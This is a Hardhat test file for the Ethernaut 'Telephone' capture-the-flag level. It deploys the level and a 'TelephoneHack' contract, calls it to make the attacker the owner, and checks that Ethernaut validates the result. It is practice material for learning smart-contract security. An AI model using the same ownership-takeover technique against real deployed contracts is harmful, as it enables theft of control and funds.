import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

describe("Telephone exploit", () => {
  async function deployTelephoneFixture() {
    const [deployer, attacker] = await ethers.getSigners();

    const TelephoneFactory = await ethers.getContractFactory("TelephoneFactory");
    const telephoneFactory = await TelephoneFactory.connect(deployer).deploy();

    // Simulate execution of createInstance to get return value of the function(address of deployed instance)
    const telephoneAddress = await telephoneFactory.connect(attacker).callStatic.createInstance(attacker.address);

    const tx = await telephoneFactory.connect(attacker).createInstance(attacker.address);
    await tx.wait();

    // Load the instance at returned address
    const telephone = await ethers.getContractAt("Telephone", telephoneAddress);

    const TelephoneHack = await ethers.getContractFactory("TelephoneHack");
    const telephoneHack = await TelephoneHack.connect(attacker).deploy(telephone.address);

    return { attacker, telephone, telephoneFactory, telephoneHack };
  }

  it("Changes the owner to attacker", async () => {
    const { attacker, telephone, telephoneFactory, telephoneHack } = await loadFixture(deployTelephoneFixture);

    const tx = await telephoneHack.connect(attacker).changeOwner(attacker.address);
    await tx.wait();

    const ownerAfterHack = await telephone.owner();

    // Assert the new owner
    expect(attacker.address).to.be.equal(ownerAfterHack, "The New Owner Is Not Set ");

    // Validate instance using Ethernaut validation
    const success = await telephoneFactory.connect(attacker).validateInstance(telephone.address, attacker.address);
    expect(success).to.be.true;
  });
});
